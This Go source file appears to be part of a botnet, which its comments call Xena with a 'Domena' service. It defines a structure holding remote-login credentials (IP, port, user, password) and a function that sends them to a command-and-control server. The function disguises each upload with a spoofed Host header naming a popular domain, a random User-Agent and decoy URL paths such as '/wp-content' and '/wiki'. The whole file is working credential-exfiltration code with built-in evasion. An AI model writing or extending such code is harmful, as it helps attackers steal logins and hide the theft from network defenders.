package main

import (
	"bytes"
	"encoding/json"
	"errors"
	"net/http"
)

type Creds struct {
	Ip   string `json:"ip"`
	Port int    `json:"port"`
	User string `json:"user"`
	Pass string `json:"pass"`
}

// submitCreds sends credentials to the Domena service.
func submitCreds(host string, creds Creds) error {
	credsJson, err := json.Marshal(creds)
	if err != nil {
		return err
	}

	payloadJson, err := serializedTraffic(string(credsJson))
	if err != nil {
		return err
	}

	request, err := http.NewRequest("POST", host+randEntry(domenaPostServiceMap), bytes.NewBuffer([]byte(payloadJson)))
	request.Host = randomPopularDomain()
	request.Header.Set("Content-Type", "application/json")
	request.Header.Set("User-Agent", randomUserAgent())
	if err != nil {
		return err
	}

	client := &http.Client{}

	response, err := client.Do(request)
	if err != nil {
		return err
	}

	defer response.Body.Close()

	// Domena service should return 201 - Created.
	if response.StatusCode != http.StatusCreated {
		return errors.New("insertion of service details failed with status:" + response.Status)
	}

	return nil
}

// Xena-Service-Domena POST /v1/services
var domenaPostServiceMap = []string{
	"/v1/services",
	"/wp-content",
	"/en-us",
	"/quote",
	"/channel",
	"/channel/profile",
	"/article",
	"/article/data",
	"/wiki",
	"/category",
	"/music",
}
